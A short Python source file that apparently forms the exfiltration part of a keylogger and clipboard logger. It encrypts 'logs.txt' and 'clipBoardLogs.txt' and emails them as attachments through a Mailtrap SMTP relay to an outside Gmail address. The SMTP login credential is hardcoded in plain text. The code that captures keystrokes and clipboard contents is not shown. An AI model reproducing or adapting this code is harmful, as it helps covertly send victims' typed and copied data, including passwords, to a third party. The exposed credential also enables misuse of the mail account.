
import smtplib
from email.message import EmailMessage
from encryption import encryptContents 

def sendEmail():
    print("sending")
    log_file = encryptContents("logs.txt")
    print(log_file)
    clipBoard_file = encryptContents("clipBoardLogs.txt")
    print(clipBoard_file)
    sender = "hello@demomailtrap.com"
    receiver = "ukharbanda20@gmail.com"
    
    message = EmailMessage()
    message["Subject"] = "Hi Mailtrap"
    message["From"] = sender
    message["To"] = receiver
    message.set_content("Please find the logs attached.")
    try:
        with open(log_file, "rb") as file:
            fileData = file.read()
            message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
        with open(clipBoard_file, "rb") as clipBoardFile:
            clipBoardFileData = clipBoardFile.read()
            message.add_attachment(clipBoardFileData, maintype="text", subtype="plain", filename="clipBoardLogs.txt")

        with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
            server.starttls()
            server.login("api", "c2151af737bd447f8f82331e58edbda8")
            server.send_message(message)
        print("Email sent successfully!")
        
    except smtplib.SMTPDataError as e:
        print("SMTP Data Error:", e)
    except smtplib.SMTPException as e:
        print("SMTP Error:", e)
    except Exception as e:
        print("General Error:", e)

if __name__ == "__main__":
    sendEmail()
